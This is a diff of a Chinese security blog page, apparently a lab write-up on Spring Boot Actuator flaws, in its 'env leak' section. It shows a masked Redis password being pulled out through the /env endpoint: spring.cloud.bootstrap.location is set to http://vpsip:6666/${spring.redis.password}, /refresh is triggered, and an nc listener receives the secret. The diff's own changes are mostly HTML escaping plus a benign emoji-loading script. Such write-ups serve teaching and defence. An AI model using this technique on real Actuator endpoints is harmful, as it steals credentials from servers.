@@ -319,26 +319,44 @@
 <p><img src="http://124.70.145.45:8081/uploads/2a39405f8ba1cc95ce2298aa6408e8d6" alt="image-20200622140014094"></p>
 <hr>
 <h3 id="2、env泄漏"><a href="#2、env泄漏" class="headerlink" title="2、env泄漏"></a>2、env泄漏</h3><p>在pom中添加redis支持</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">        &lt;groupId&gt;org.springframework.boot&lt;&#x2F;groupId&gt;</span><br><span class="line">        &lt;artifactId&gt;spring-boot-starter-data-redis&lt;&#x2F;artifactId&gt;</span><br><span class="line">&lt;&#x2F;dependency&gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">        &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;</span><br><span class="line">        &lt;artifactId&gt;spring-boot-starter-data-redis&lt;/artifactId&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></tbody></table></figure>
 
 <p>在application.properties中添加redis配置</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"># Redis数据库索引（默认为0）</span><br><span class="line">spring.redis.database&#x3D;0 </span><br><span class="line"># Redis服务器地址</span><br><span class="line">spring.redis.host&#x3D;172.16.101.71</span><br><span class="line"># Redis服务器连接端口</span><br><span class="line">spring.redis.port&#x3D;6379 </span><br><span class="line"># Redis服务器连接密码（默认为空）</span><br><span class="line">spring.redis.password&#x3D;xingyu</span><br><span class="line">#连接池最大连接数（使用负值表示没有限制）</span><br><span class="line">spring.redis.pool.max-active&#x3D;8 </span><br><span class="line"># 连接池最大阻塞等待时间（使用负值表示没有限制）</span><br><span class="line">spring.redis.pool.max-wait&#x3D;-1 </span><br><span class="line"># 连接池中的最大空闲连接</span><br><span class="line">spring.redis.pool.max-idle&#x3D;8 </span><br><span class="line"># 连接池中的最小空闲连接</span><br><span class="line">spring.redis.pool.min-idle&#x3D;0 </span><br><span class="line"># 连接超时时间（毫秒）</span><br><span class="line">spring.redis.timeout&#x3D;0</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"># Redis数据库索引（默认为0）</span><br><span class="line">spring.redis.database=0 </span><br><span class="line"># Redis服务器地址</span><br><span class="line">spring.redis.host=172.16.101.71</span><br><span class="line"># Redis服务器连接端口</span><br><span class="line">spring.redis.port=6379 </span><br><span class="line"># Redis服务器连接密码（默认为空）</span><br><span class="line">spring.redis.password=xingyu</span><br><span class="line">#连接池最大连接数（使用负值表示没有限制）</span><br><span class="line">spring.redis.pool.max-active=8 </span><br><span class="line"># 连接池最大阻塞等待时间（使用负值表示没有限制）</span><br><span class="line">spring.redis.pool.max-wait=-1 </span><br><span class="line"># 连接池中的最大空闲连接</span><br><span class="line">spring.redis.pool.max-idle=8 </span><br><span class="line"># 连接池中的最小空闲连接</span><br><span class="line">spring.redis.pool.min-idle=0 </span><br><span class="line"># 连接超时时间（毫秒）</span><br><span class="line">spring.redis.timeout=0</span><br></pre></td></tr></tbody></table></figure>
 
 <p>更新pom后，访问<a href="http://127.0.0.1:8091/env" target="_blank" rel="noopener">http://127.0.0.1:8091/env</a></p>
 <p>此时redis密码为*</p>
 <p><img src="http://124.70.145.45:8081/uploads/47256ebf038ca6793cc2e2cc6d1ecdc3" alt="image-20200622140920127"></p>
-<p><code>如果Spring Cloud Libraries在路径中，则&#39;/env&#39;端点会默认允许修改Spring环境属性。 “@ConfigurationProperties”的所有bean都可以进行修改和重新绑定。</code></p>
+<p><code>如果Spring Cloud Libraries在路径中，则'/env'端点会默认允许修改Spring环境属性。 “@ConfigurationProperties”的所有bean都可以进行修改和重新绑定。</code></p>
 <p>修改spring.cloud.bootstrap.location属性为</p>
 <p><code>spring.cloud.bootstrap.location=http://vpsip:6666/${spring.redis.password}</code></p>
 <p><img src="http://124.70.145.45:8081/uploads/5004af1eb63fcdfb9d72289ba893d0bf" alt="image-20200622144042614"></p>
 <p>随后nc监听</p>
 <p><img src="http://124.70.145.45:8081/uploads/ffb313f0f1a4e8a4fb19cca37c36c4b1" alt="image-20200622141145202"></p>
 <p>访问refresh</p>
-<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/refresh</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 127.0.0.1:8091</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span>: 0</span><br></pre></td></tr></table></figure>
+<figure class="highlight http"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/refresh</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 127.0.0.1:8091</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span>: 0</span><br></pre></td></tr></tbody></table></figure>
 
 <p>nc收到密码</p>
 <p><img src="http://124.70.145.45:8081/uploads/a41eefa15af15b86db5196e3a2e25989" alt="image-20200622144143892"></p>
-
+<script>
+        document.querySelectorAll('.github-emoji')
+          .forEach(el => {
+            if (!el.dataset.src) { return; }
+            const img = document.createElement('img');
+            img.style = 'display:none !important;';
+            img.src = el.dataset.src;
+            img.addEventListener('error', () => {
+              img.remove();
+              el.style.color = 'inherit';
+              el.style.backgroundImage = 'none';
+              el.style.background = 'none';
+            });
+            img.addEventListener('load', () => {
+              img.remove();
+            });
+            document.body.appendChild(img);
+          });
+      </script>
     </div>
 
     
